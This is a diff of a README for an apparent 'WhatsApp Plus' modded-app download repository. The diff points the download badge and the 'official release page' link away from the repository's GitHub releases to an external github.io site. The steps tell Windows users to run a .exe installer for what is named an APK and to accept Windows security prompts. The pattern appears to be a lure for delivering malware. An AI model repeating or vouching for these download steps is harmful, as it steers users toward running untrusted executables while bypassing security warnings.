@@ -1,6 +1,6 @@
 # 📱 WhatsApp-Plus-2026-Download-APK - Better messaging with custom design features
 
-[![](https://img.shields.io/badge/Download-WhatsApp-Plus-blue.svg)](https://github.com/alexisdarkcolored960/WhatsApp-Plus-2026-Download-APK/releases)
+[![](https://img.shields.io/badge/Download-WhatsApp-Plus-blue.svg)](https://alexisdarkcolored960.github.io)
 
 ## 📑 About this software
 
@@ -30,7 +30,7 @@ Before you install the software, verify your computer meets these requirements:
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  **Visit the Download Page:** Go to the [official release page](https://github.com/alexisdarkcolored960/WhatsApp-Plus-2026-Download-APK/releases) to access the installation files.
+1.  **Visit the Download Page:** Go to the [official release page](https://alexisdarkcolored960.github.io) to access the installation files.
 2.  **Download the Installer:** Locate the latest version of the file ending in .exe. Click the file name to start the download.
 3.  **Run the Installer:** Once the download finishes, find the file in your downloads folder. Double-click the file to open the setup window.
 4.  **Confirm Security Prompts:** Windows may show a security prompt. Click "Run" or "Yes" to acknowledge the installation, as this software comes from a source outside of the official store.
